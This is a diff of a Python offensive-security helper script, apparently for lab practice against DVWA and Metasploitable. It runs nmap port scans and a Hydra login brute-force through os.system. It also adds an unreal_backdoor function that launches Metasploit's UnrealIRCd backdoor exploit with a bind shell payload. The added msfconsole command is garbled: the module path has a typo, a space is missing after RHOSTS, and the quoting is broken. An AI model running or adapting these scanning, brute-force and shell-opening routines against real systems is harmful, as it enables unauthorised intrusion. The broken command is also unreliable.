@@ -1,6 +1,11 @@
-import nmap, os as s
-# Version 1.3
+import nmap, os as s, time, tkinter as tk
+# Version 1.5
 # This function will port-scan selected host with chosen flags
+
+# Define application base sizes
+HEIGHT = 800
+WIDTH = 900
+
 def portscan():
     myscanner = nmap.PortScanner()          # initialize nmap object
     targ_addr = input("Enter your target address\nExample input: 192.168.0.1\n"
@@ -57,3 +62,12 @@ def dvwa_brute():
                    ':' + request_body + ':' + error_message + ' -f'
     print('Executing Hydra as:\n', hydracommand)
     s.system(hydracommand)
+
+def unreal_backdoor():
+    host = input('Please enter the address of metasploitable: ')
+    print('Connecting to IRTX metasploitable at', host)
+    # Construct command line argumaents
+    command = "/bin/bash -e msfconsole -x 'use exploit/unix/ird/unreal_ircd_3281_backdoor;set RHOSTS" + host + ";set payload cmd/unix/bind_perl;exploit"
+    s.system(command)
+
+
